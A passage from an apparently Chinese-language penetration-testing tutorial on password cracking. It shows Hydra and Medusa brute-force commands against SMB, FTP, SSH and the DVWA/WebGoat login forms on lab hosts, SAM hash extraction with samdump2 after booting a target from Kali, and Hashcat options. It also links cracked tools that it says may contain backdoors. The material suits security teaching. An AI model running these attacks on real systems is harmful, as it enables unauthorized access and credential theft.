pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hydra is a tool to guess/crack valid login/password pairs.</span></span><br><span class="line"><span class="string">Licensed under AGPL v3.0. The newest version is always available at;</span></span><br><span class="line"><span class="string">https://github.com/vanhauser-thc/thc-hydra</span></span><br><span class="line"><span class="string">Please don&#x27;</span>t use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people <span class="keyword">do</span> not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">These services were not compiled <span class="keyword">in</span>: afp ncp oracle sapr3 smb2.</span><br><span class="line"></span><br><span class="line">Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables <span class="keyword">for</span> a proxy setup.</span><br><span class="line">E.g. % <span class="built_in">export</span> HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY_HTTP=http://login:pass@proxy:8080</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure>
<h4 id="windowswin2003为例-密码破解">（1）windows【win2003为例】
密码破解</h4>
<ul>
<li><strong>smb 破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l administrator -P password.lst  smb://10.10.10.130/admin$ -vV</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820202948057-946805752.png" /></p>
<ul>
<li><strong>ftp 破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l administrator -P password.lst ftp://10.10.10.130   -vV </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820203152839-1758820491.png" /></p>
<h4 id="linux-密码破解">（2）Linux 密码破解</h4>
<ul>
<li><strong>SSH 破解</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P password.lst ssh://10.10.10.134 -e nsr  -t 4 -vV    <span class="comment">#-t指定并发连接数，hydra不稳定，建议小点</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820210334225-371749323.png" /></p>
<ul>
<li><strong>其它破解类似</strong></li>
</ul>
<h4 id="图形界面-xhydra">（3）图形界面 xhydra</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820211909341-1805899549.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212016572-1484800408.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212212820-1853251876.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212256052-1375854346.png" /></p>
<h4
id="http表单身份认证dvwa靶机破解为例">（4）HTTP表单身份认证【DVWA靶机破解为例】</h4>
<ul>
<li><strong>以登陆失败返回的特征字符串作为 继续破解的标志</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P password.lst 10.10.10.134  http-post-form <span class="string">&quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&quot;</span> -V</span><br></pre></td></tr></table></figure>
<p><strong>注，Login
failed是登陆失败返回的特征字符串，具体用POST还是GET提交，可以如下图先测试下</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142328431-1028410094.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142000005-41395763.png" /></p>
<ul>
<li><strong>以登陆成功返回的特征字符串作为 停止破解的标志</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P password.lst 10.10.10.134  http-post-form <span class="string">&quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot;</span> -V</span><br></pre></td></tr></table></figure>
<p><strong>注，S=index.php是正确登录后的界面</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142626617-1109006011.png" /></strong></p>
<ul>
<li><strong>补充</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">…………/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-C：先访问指定页面取得cookie【也就是说如果需要检查cookie，则可以先到其他页面获取个可用的cookie】</strong></li>
<li><strong>-H：指定http头【即指定所发包的包头信息】</strong></li>
<li><strong>支持的请求方式：https- post form、http-get form、https- get
form</strong></li>
<li><strong>-S：使用SSL连接</strong></li>
</ul>
<h4 id="pw-inspector字典筛选工具">（5）pw-inspector【字典筛选工具】</h4>
<p>按长度和字符集筛选字典</p>
<ul>
<li><strong>用法</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+Syntax: pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p -s</span><br><span class="line">+</span><br><span class="line">+Options:</span><br><span class="line">+  -i FILE    file to <span class="built_in">read</span> passwords from (default: stdin)</span><br><span class="line">+  -o FILE    file to write valid passwords to (default: stdout)</span><br><span class="line">+  -m MINLEN  minimum length of a valid password</span><br><span class="line">+  -M MAXLEN  maximum length of a valid password</span><br><span class="line">+  -c MINSETS the minimum number of sets required (default: all given)</span><br><span class="line">+Sets:</span><br><span class="line">+  -l         lowcase characters (a,b,c,d, etc.)</span><br><span class="line">+  -u         upcase characters (A,B,C,D, etc.)</span><br><span class="line">  -n         numbers (1,2,3,4, etc.)</span><br><span class="line">  -p         printable characters (<span class="built_in">which</span> are not -l/-n/-p, e.g. $,!,/,(,*, etc.)</span><br><span class="line">  -s         special characters - all others not within the sets above</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>示例：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pw-inspector -i 1.txt -o 2.txt -l     <span class="comment">#过滤小写字母的密码</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822172740061-862979314.png" /></p>
<h4 id="密码破解效率">（6）密码破解效率</h4>
<ul>
<li>密码复杂度(字典命中率)</li>
<li>带宽、协议、服务器性能、客户端性能</li>
<li>锁定阈值</li>
<li>单位时间最大登陆请求次数</li>
</ul>
<h4 id="hydra的缺点">（7）Hydra的缺点</h4>
<ul>
<li>稳定性差,程序时常崩溃</li>
<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
<li>每主机新建进程，每服务 新建实例</li>
<li>一大量目标破解时性能差</li>
</ul>
<h3 id="medusa-介绍">2、Medusa 介绍</h3>
<h4 id="medusa-的特点">（1）Medusa 的特点</h4>
<ul>
<li>稳定性好</li>
<li>速度控制得当</li>
<li>基于线程</li>
<li>支持模块少于hydra (不支持RDP )</li>
<li>WEB- Form支持存在缺陷</li>
</ul>
<h4 id="支持的破解模块">（2）支持的破解模块</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># medusa -d </span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">  Available modules <span class="keyword">in</span> <span class="string">&quot;.&quot;</span> :</span><br><span class="line"></span><br><span class="line">  Available modules <span class="keyword">in</span> <span class="string">&quot;/usr/lib/x86_64-linux-gnu/medusa/modules&quot;</span> :</span><br><span class="line">    + cvs.mod : Brute force module <span class="keyword">for</span> CVS sessions : version 2.0</span><br><span class="line">    + ftp.mod : Brute force module <span class="keyword">for</span> FTP/FTPS sessions : version 2.1</span><br><span class="line">    + http.mod : Brute force module <span class="keyword">for</span> HTTP : version 2.1</span><br><span class="line">    + imap.mod : Brute force module <span class="keyword">for</span> IMAP sessions : version 2.0</span><br><span class="line">    + mssql.mod : Brute force module <span class="keyword">for</span> M$-SQL sessions : version 2.0</span><br><span class="line">    + mysql.mod : Brute force module <span class="keyword">for</span> MySQL sessions : version 2.0</span><br><span class="line">    + nntp.mod : Brute force module <span class="keyword">for</span> NNTP sessions : version 2.0</span><br><span class="line">    + pcanywhere.mod : Brute force module <span class="keyword">for</span> PcAnywhere sessions : version 2.0</span><br><span class="line">    + pop3.mod : Brute force module <span class="keyword">for</span> POP3 sessions : version 2.0</span><br><span class="line">    + postgres.mod : Brute force module <span class="keyword">for</span> PostgreSQL sessions : version 2.0</span><br><span class="line">    + rexec.mod : Brute force module <span class="keyword">for</span> REXEC sessions : version 2.0</span><br><span class="line">    + rlogin.mod : Brute force module <span class="keyword">for</span> RLOGIN sessions : version 2.0</span><br><span class="line">    + rsh.mod : Brute force module <span class="keyword">for</span> RSH sessions : version 2.0</span><br><span class="line">    + smbnt.mod : Brute force module <span class="keyword">for</span> SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1</span><br><span class="line">    + smtp-vrfy.mod : Brute force module <span class="keyword">for</span> verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1</span><br><span class="line">    + smtp.mod : Brute force module <span class="keyword">for</span> SMTP Authentication with TLS : version 2.0</span><br><span class="line">    + snmp.mod : Brute force module <span class="keyword">for</span> SNMP Community Strings : version 2.1</span><br><span class="line">    + ssh.mod : Brute force module <span class="keyword">for</span> SSH v2 sessions : version 2.1</span><br><span class="line">    + svn.mod : Brute force module <span class="keyword">for</span> Subversion sessions : version 2.1</span><br><span class="line">    + telnet.mod : Brute force module <span class="keyword">for</span> telnet sessions : version 2.0</span><br><span class="line">    + vmauthd.mod : Brute force module <span class="keyword">for</span> the VMware Authentication Daemon : version 2.0</span><br><span class="line">    + vnc.mod : Brute force module <span class="keyword">for</span> VNC sessions : version 2.1</span><br><span class="line">    + web-form.mod : Brute force module <span class="keyword">for</span> web forms : version 2.1</span><br><span class="line">    + wrapper.mod : Generic Wrapper Module : version 2.0</span><br></pre></td></tr></table></figure>
<h4 id="基本用法">（3）基本用法</h4>
<ul>
<li><strong>help</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># medusa -help</span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ALERT: User logon information must be supplied.</span><br><span class="line"></span><br><span class="line">Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br><span class="line">  -h [TEXT]    : Target hostname or IP address</span><br><span class="line">  -H [FILE]    : File containing target hostnames or IP addresses</span><br><span class="line">  -u [TEXT]    : Username to <span class="built_in">test</span></span><br><span class="line">  -U [FILE]    : File containing usernames to <span class="built_in">test</span></span><br><span class="line">  -p [TEXT]    : Password to <span class="built_in">test</span></span><br><span class="line">  -P [FILE]    : File containing passwords to <span class="built_in">test</span></span><br><span class="line">  -C [FILE]    : File containing combo entries. See README <span class="keyword">for</span> more information.</span><br><span class="line">  -O [FILE]    : File to append <span class="built_in">log</span> information to</span><br><span class="line">  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)</span><br><span class="line">  -M [TEXT]    : Name of the module to execute (without the .mod extension)</span><br><span class="line">  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple <span class="built_in">times</span> with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.)</span><br><span class="line">  -d           : Dump all known modules</span><br><span class="line">  -n [NUM]     : Use <span class="keyword">for</span> non-default TCP port number</span><br><span class="line">  -s           : Enable SSL</span><br><span class="line">  -g [NUM]     : Give up after trying to connect <span class="keyword">for</span> NUM seconds (default 3)</span><br><span class="line">  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)</span><br><span class="line">  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.</span><br><span class="line">  -c [NUM]     : Time to <span class="built_in">wait</span> <span class="keyword">in</span> usec to verify socket is available (default 500 usec).</span><br><span class="line">  -t [NUM]     : Total number of logins to be tested concurrently</span><br><span class="line">  -T [NUM]     : Total number of hosts to be tested concurrently</span><br><span class="line">  -L           : Parallelize logins using one username per thread. The default is to process the entire username before proceeding.</span><br><span class="line">  -f           : Stop scanning host after first valid username/password found.</span><br><span class="line">  -F           : Stop audit after first valid username/password found on any host.</span><br><span class="line">  -b           : Suppress startup banner</span><br><span class="line">  -q           : Display module<span class="string">&#x27;s usage information</span></span><br><span class="line"><span class="string">  -v [NUM]     : Verbose level [0 - 6 (more)]</span></span><br><span class="line"><span class="string">  -w [NUM]     : Error debug level [0 - 10 (more)]</span></span><br><span class="line"><span class="string">  -V           : Display version</span></span><br><span class="line"><span class="string">  -Z [TEXT]    : Resume scan based on map of previous scan</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>常用参数</strong></li>
<li><strong>-e：同hydra</strong></li>
<li><strong>-F：破解到第一个就停止</strong></li>
<li><strong>-n：非默认端口</strong></li>
<li><strong>-S：使用SSL连接</strong></li>
<li><strong>-T：并发主机数</strong></li>
<li><strong>medusa -M xxx
-q：查看xxx模块所需具体参数，并用-m指定</strong></li>
</ul>
<h4 id="windows-密码破解文件共享为例">（4）Windows
密码破解【文件共享为例】</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -M smbnt -h 10.10.10.130 -u administrator -P password.lst -e ns -F</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822175158151-232618665.png" /></p>
<h4 id="linux-密码破解ssh服务为例"><strong>（5）Linux
密码破解【SSH服务为例】</strong></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -M ssh -h 10.10.10.134 -u root -P password.lst -e ns -F</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822175815507-948175627.png" /></p>
<h4 id="网站访问破解owasp-webgoat为例">（6）网站访问破解【OWASP
<strong>WebGoat为例】</strong></h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822200830911-935576982.png" /></p>
<p><strong>破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 10.10.10.134  -u guest -P password.lst -M http -m DIR:<span class="string">&quot;/WebGoat/attack&quot;</span> </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822201247069-2083392879.png" /></p>
<h4 id="http-登录表单破解-dvwa靶机破解为例"><strong>（7）HTTP
登录表单破解【</strong> <strong>DVWA靶机破解为例】</strong></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 10.10.10.134  -u admin -P password.lst -M web-form -m FORM:<span class="string">&quot;dvwa/login.php&quot;</span> -m DENY-SIGNAL:<span class="string">&quot;login.php&quot;</span>  -m FORM-DATA:<span class="string">&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822191947423-964125039.png" /></p>
<p><strong>注，也就是说发包后，返回200才可继续往下破解尝试</strong></p>
<h2 id="离线密码破解">4. 离线密码破解</h2>
<ul>
<li><strong>身份认证</strong></li>
<li><strong>禁止明文传输密码</strong></li>
<li><strong>每次认证使用HASH 算法加密密码传输（ HASH
算法加密容易、解密困难）</strong></li>
<li><strong>服务器端用户数据库应加盐加密保存</strong></li>
<li><strong>破解思路</strong></li>
<li><strong>嗅探获取密码 HASH</strong></li>
<li><strong>利用漏洞登陆服务器并从用户数据库获取密码 HASH</strong></li>
<li><strong>识别HASH 类型，长度、字符集</strong></li>
<li><strong>利用离线破解工具碰撞密码HASH</strong></li>
<li><strong>优势</strong></li>
<li><strong>离线不会触发密码锁定机制</strong></li>
<li><strong>不会产生大量登陆失败日志引起管理员注意</strong></li>
</ul>
<h3 id="hash-识别工具"><strong>1、HASH 识别工具</strong></h3>
<ul>
<li><strong>hash‐identifier</strong></li>
<li><strong>Hashid</strong></li>
<li><strong>可能识别错误或无法识别</strong></li>
<li><strong>示例</strong></li>
</ul>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909115633736-1141097131.png" /></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909115745124-1986177475.png" /><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909120004170-1750492458.png" /></p>
<h3 id="windows-hash获取工具"><strong>2、Windows
HASH获取工具</strong></h3>
<ul>
<li><strong>利用漏洞：Pwdump 、 fgdump 、 mimikatz 、 wce</strong></li>
<li><strong>物理接触：samdump2</strong></li>
<li><strong>Kali ISO 启动虚拟机</strong></li>
<li><strong>mount /dev/sda2 /mnt</strong></li>
<li><strong>cd /mnt /Windows/ config</strong></li>
<li><strong>samdump2 SYSTEM SAM -o sam.hash</strong></li>
<li><strong>利用nc 传输 HASH</strong></li>
</ul>
<p><strong>获取Windows目标机的用户名和登录密码方法，在可以物理接触目标机的情况下，通过
Kali
的ISO引导目标机启动，然后将目标机磁盘挂载到Kali上，再利用samdump2工具提取目标机SAM数据库，对提取到的HASH进行分析破解。</strong></p>
<p><strong>演示【以VM VirtualBox下安装的Windows7为例】</strong></p>
<p><strong>注，之所以选择
VirtualBox是因为要用Kali的ISO引导启动系统，VirtualBox可以设置系统的启动顺序【软驱，光驱，硬盘】，VMware
Workstation没法设置。</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909175458893-1798938684.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909175707857-1970216949.png" /></p>
<p><strong>查看磁盘分区</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909180602230-106750733.png" /></p>
<p><strong>把Win7硬盘挂载到Kali</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909180853093-2097286501.png" /></p>
<p><strong>samdump2 提取SAM中的HASH</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">samdump2 SYSTEM SAM -o sam.hash </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909181147442-2055388588.png)</span><br><span class="line"></span><br><span class="line">**用户名，密码存于SAM数据库，而SYSTEM保存着一个加密SAM数据库的密钥【默认情况下没有密钥】，也就是说如果SAM数据库被加密的话，我们登录时需要输两次密码【第一次SYSTEM中的密码，第二次用户名及登录密码】才能进入系统。**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909181957182-244014619.png)</span><br><span class="line"></span><br><span class="line">**注，windows提取到的两条HASH分别是LM-Hash【已弃用】和NTLM-Hash，这是对同一个密码的两种不同的加密方式。**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220909190326717-1348486228.png)**</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3、Syskey加密SAM数据库及破解</span></span><br><span class="line"></span><br><span class="line">  * **使用Bootkey 利用 RC4 算法加密 SAM 数据库**</span><br><span class="line">  * **Bootkey保存于 SYSTEM 文件中**</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **（1）bkhive 破解**</span></span><br><span class="line"></span><br><span class="line">  * **Kali 2.0  弃用了 bkhive，可以用 Kali 1.x系列实验【[ **http://old.kali.org/kali-images/**](http://old.kali.org/kali-images/)】**</span><br><span class="line">  * **bkhive  SYSTEM  key【 **从SYSTEM 文件中提取bootkey】**</span><br><span class="line">  * **samdump2 SAM key &gt; sam.hash【用bootkey解密SAM，提取未加密前的<span class="built_in">hash</span>，注，samdump2版本已更新，不再支持此功能，也得用老版本的】**</span><br><span class="line"></span><br><span class="line">**示例演示**</span><br><span class="line"></span><br><span class="line">  * **先用Syskey工具对SAM 数据库加密**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911113637882-451568300.png)**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911113750998-1810251944.png)</span><br><span class="line"></span><br><span class="line">  * **加密后的效果**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911115525539-1834495718.gif)</span><br><span class="line"></span><br><span class="line">**由于Kali 2.0已经弃用了bkhive，所以这里直接用BT5实验，另为简便起见，直接用BT5的ISO引导启动win7，在win7中演示破解 ……**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911143000297-762009203.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150815115-2131205080.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150911509-567371409.png)</span><br><span class="line"></span><br><span class="line">  * **BT5没用图形界面，此处没法手动拷贝，用nc传下。然后用前面的方法对获得的<span class="built_in">hash</span>【79 ……<span class="built_in">cd</span>】进行破解即可。**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220911150920548-1735901148.png)</span><br><span class="line"></span><br><span class="line">  * **注，基本流程/原理如上。但上图提取到的<span class="built_in">hash</span>【79 ……<span class="built_in">cd</span>】依旧是SAM被加密后的<span class="built_in">hash</span>【本应是syskey加密SAM前NTLM算法加密登录密码的HASH】，没搞明白为啥，有看懂的可以评论说下，感谢！**</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **（2）PSPR 破解**</span></span><br><span class="line"></span><br><span class="line">**Proactive System Password Recovery**  (简称为 PSPR，即以前的 Advanced Windows</span><br><span class="line">Password Recovery) 是一个恢复 Windows 所有密码类型的程序：登录密码 (在用户已登录和拥有管理员权限时)、屏保护密码、.NET</span><br><span class="line">护照密码、RAS 和拨号密码、共享资源密码、SYSKEY 启动密码、存储在缓存的凭证密码、无线 (WEP 和 WPA-PSK)</span><br><span class="line">加密键等。程序同样也能显示所有用户和组 (它们的属性)，允许在其它用户环境中运行任何程序、显示密码历史 hashes、从 SAM 和系统文件读取密码</span><br><span class="line">hashes、读取保护的存储记录、解密 Windows 脚本、揭示隐藏在星号下的密码、启用禁用的控制器、在 PWL 文件上执行暴力和字典攻击</span><br><span class="line">(Windows 9x)。还可以显示产品 ID 和 Widnows CD keys、微软 Office 和其它微软的安装软件。</span><br><span class="line"></span><br><span class="line">**下载：** 链接：&lt;https://pan.baidu.com/s/1oVsFUZIo-</span><br><span class="line">bquAJwNfJSjGA&gt;，提取码：g780，已破解，安装时不需要注册码，建议虚拟机使用【可能有后门】</span><br><span class="line"></span><br><span class="line">**操作和前面相似，拷贝目标机【win7】在C:\Windows\System32\config目录下的SAM、Security 和 Security 文件到安装有PSPR的系统上，暴力破解如下：**</span><br><span class="line"></span><br><span class="line">**![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912171218577-867961977.png)**</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912171610447-789869725.png)</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912172029684-903193067.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### （3） **saminside 破解【已知启动密码】**</span></span><br><span class="line"></span><br><span class="line">**下载：** 链接：&lt;https://pan.baidu.com/s/11yy6u7llKdWtFW-2F6eMlw&gt;，提取码：cpxj</span><br><span class="line"></span><br><span class="line">**注，syskey设置的启动密码用saminside是破解不了的，如下图【** The system key doesn<span class="string">&#x27;t match SAM</span></span><br><span class="line"><span class="string">registry file! **】：**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912172740989-1805615435.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**已知启动密码破解登录密码【速度取决于密码复杂程度】如下图**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173152284-1065104784.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173235793-1255364147.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220912173259930-394979048.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 4、Hashcat</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  * **开源多线程密码破解工具**</span></span><br><span class="line"><span class="string">  * **支持CPU、GPU、APU、DSP和FPGA等多种计算核心**</span></span><br><span class="line"><span class="string">  * **支持多种hash散列算法，支持对rar、office、pdf、windows账户、wifi等多种密码的破解**</span></span><br><span class="line"><span class="string">  * **常用参数**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">-a  指定要使用的破解模式-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span></span><br><span class="line"><span class="string">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span></span><br><span class="line"><span class="string">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span></span><br><span class="line"><span class="string">--show  显示已经破解的hash及该hash所对应的明文</span></span><br><span class="line"><span class="string">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span></span><br><span class="line"><span class="string">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span></span><br><span class="line"><span class="string">--increment-max  密码最大长度,同上</span></span><br><span class="line"><span class="string">--outfile-format 指定破解结果的输出格式id,默认是3</span></span><br><span class="line"><span class="string">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span></span><br><span class="line"><span class="string">--remove     删除已被破解成功的hash</span></span><br><span class="line"><span class="string">-r       使用自定义破解规则</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>模式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 Straight：字典破解</span><br><span class="line">1 Combination：将字典中密码进行组合 1 2 &gt; 11 22 12 21</span><br><span class="line">3 Brute force：指定字符集【或全部字符集】所有组合</span><br><span class="line">6  Hybrid Wordlist + Mask：混合字典+掩码</span><br><span class="line">7  Hybrid Mask + Wordlist：混合掩码+字典</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>掩码规则</strong></li>
</ul>
